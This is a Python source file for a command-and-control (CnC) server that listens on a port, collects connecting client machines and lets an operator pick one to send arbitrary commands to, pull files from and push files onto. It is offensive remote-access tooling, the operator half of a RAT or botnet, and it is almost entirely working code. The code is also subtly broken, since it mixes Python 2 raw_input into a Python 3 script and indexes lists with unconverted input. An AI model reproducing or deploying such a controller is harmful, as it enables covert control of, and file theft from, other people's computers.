# CnC server

#!/usr/bin/env python3

import sys
import socket
from socket import AF_INET, SOCK_STREAM
from common import pr, clear, get_cipher
from common import Encode, Decode, Send, Receive

# server socket
server = socket.socket(AF_INET, SOCK_STREAM)
server.bind(('', 2000))
server.listen()

# client sockets
socks = []
clients = []
active = False

def upload(sock, file):
  Send(sock, 'upload ' + file)
  pr('Uploading ' + file)

  f = open(file, 'rb')
  d = f.read()
  Send(sock, d, '')
  f.close()

def close(sock, client):
  sock.close()
  socks.remove(sock)
  clients.remove(client)
  refresh()

def refresh():
  clear()
  pr('Listening for clients...')

  l = len(clients)

  if l == 0:
    pr('...')
    return

  for i in range(0, l):
    pr('Client %d: %s' % (i, clients[i]))

  pr('Press Ctrl+C to interact with client.')

while True:
  refresh()
  server.settimeout(10)
  try:
    try:
      s, a = server.accept()
    except socket.timeout:
      continue

    s.settimeout(None)
    socks.append(s)
    clients.append(str(a))
    refresh()
  except KeyboardInterrupt:
    activate = input('Enter option: ')
    
    Send(socks[activate], 'activate')
    pr('Activating client %d: %s' % (activate, clients[activate]))

    cipher = get_cipher()
    active = True

  while active:
    sock = socks[activate]
    client = clients[activate]

    try:
      data = Receive(sock)
    except:
      active = False
      pr('Client %s disconnected.' % client)
      close(sock, client)
      break

    if data == 'exit ok':
      active = False
      pr('Exit.')
      close(sock, client)
      break

    sys.stdout.write(data)
    nc = raw_input() # next cmd

    if nc.startswith('download '):
      f = open(nc.split(' ')[1], 'wb')
      d = Receive(sock)
      f.write(d)
      f.close()

    elif nc.startswith('upload '):
      upload(sock, nc.split(' ')[1])

    Send(sock, nc)
